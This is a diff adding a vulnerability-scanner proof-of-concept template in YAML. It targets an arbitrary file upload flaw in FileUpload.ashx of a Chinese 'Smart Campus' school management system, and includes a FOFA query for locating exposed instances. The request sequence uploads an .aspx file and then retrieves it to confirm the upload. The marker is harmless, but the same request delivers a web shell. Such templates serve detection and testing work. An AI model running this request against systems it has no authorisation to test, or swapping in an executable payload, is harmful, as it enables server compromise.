@@ -1,0 +1,24 @@
+id: poc-yaml-winstaryc-fileupload-ashx-anyfile-upload
+info:
+  name: 智慧校园(安校易)管理系统 FileUpload.ashx 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 智慧校园(安校易)管理系统
+  fofa: title="智慧综合管理平台登入"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /Tool/FileUpload.ashx?action=PhotoByte&ext={{.t1}}.aspx
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: '{{.t2}}'
+  expression: status_code == 200 && contains(body,".aspx")
+  output:
+  - regex_match(body,"/adinfo/(?P<file>.*?).aspx")
+- method: GET
+  path: /upload/adinfo/{{.file}}.aspx
+  expression: status_code == 200 && body == t2
+transport: http
